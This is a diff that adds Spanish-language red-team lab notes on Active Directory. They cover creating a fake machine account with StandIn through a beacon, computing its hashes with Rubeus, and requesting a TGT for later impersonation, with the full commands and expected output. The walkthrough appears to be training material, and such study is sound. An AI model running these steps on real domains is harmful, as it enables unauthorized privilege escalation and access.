@@ -1,0 +1,95 @@
+## Sin ser admin local
+
+Si no tienes acceso como administrador local a un equipo, puedes crear tu propio objeto de equipo. De manera predeterminada, incluso los usuarios de dominio pueden unir hasta 10 equipos al dominio, controlado por el atributo `ms-DS-MachineAccountQuota` del objeto de dominio.
+
+```powershell
+beacon> powershell Get-DomainObject -Identity "DC=dev,DC=cyberbotic,DC=io" -Properties ms-DS-MachineAccountQuota
+```
+
+**Salida esperada:**
+
+```plaintext
+ms-ds-machineaccountquota
+-------------------------
+                       10
+```
+
+## Crear un nuevo objeto de equipo
+
+**StandIn** es un toolkit post-explotación creado por Ruben Boonen que permite crear un equipo con una contraseña aleatoria.
+
+```powershell
+beacon> execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make
+```
+
+**Salida esperada:**
+
+```yaml
+[?] Using DC    : dc-2.dev.cyberbotic.io
+    |_ Domain   : dev.cyberbotic.io
+    |_ DN       : CN=EvilComputer,CN=Computers,DC=dev,DC=cyberbotic,DC=io
+    |_ Password : oIrpupAtF1YCXaw
+
+[+] Machine account added to AD..
+```
+
+## Calcular los hashes para el objeto de equipo
+
+Usa **Rubeus** para calcular los hashes asociados con el nuevo equipo.
+
+```powershell
+PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer$ /domain:dev.cyberbotic.io
+```
+
+**Salida esperada:**
+
+```plaintext
+[*] Action: Calculate Password Hash(es)
+
+[*] Input password             : oIrpupAtF1YCXaw
+[*] Input username             : EvilComputer$
+[*] Input domain               : dev.cyberbotic.io
+[*] Salt                       : DEV.CYBERBOTIC.IOhostevilcomputer.dev.cyberbotic.io
+[*]       rc4_hmac             : 73D0774058830F841C9205C857C9EE62
+[*]       aes128_cts_hmac_sha1 : FB9A1AB8567D4EF4CEA6186A115D091A
+[*]       aes256_cts_hmac_sha1 : 7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044
+[*]       des_cbc_md5          : 49B5514F1F45700D
+```
+
+## Solicitar un TGT para el objeto de equipo falso
+
+Usa el hash AES calculado para solicitar un TGT (Ticket Granting Ticket).
+
+```powershell
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044 /nowrap
+```
+
+**Salida esperada:**
+
+```yaml
+[*] Action: Ask TGT
+
+[*] Using aes256_cts_hmac_sha1 hash: 7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044
+[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\EvilComputer$'
+[*] Using domain controller: 10.10.122.10:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIF8j[...]MuaW8=
+
+  ServiceName              :  krbtgt/dev.cyberbotic.io
+  ServiceRealm             :  DEV.CYBERBOTIC.IO
+  UserName                 :  EvilComputer$
+  UserRealm                :  DEV.CYBERBOTIC.IO
+  StartTime                :  9/13/2022 2:31:34 PM
+  EndTime                  :  9/14/2022 12:31:34 AM
+  RenewTill                :  9/20/2022 2:31:34 PM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  /s6yAyTa1670VNAT9yYBGya/mqOU/YJSLu0XuD2ReBE=
+  ASREP (key)              :  7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044
+```
+
+## Continuación
+
+El resto del ataque sigue los mismos pasos descritos anteriormente. Utiliza el TGT para realizar suplantaciones, obtener tickets de servicio (TGS) y acceder a los recursos objetivo como si fuera un equipo legítimo dentro del dominio.
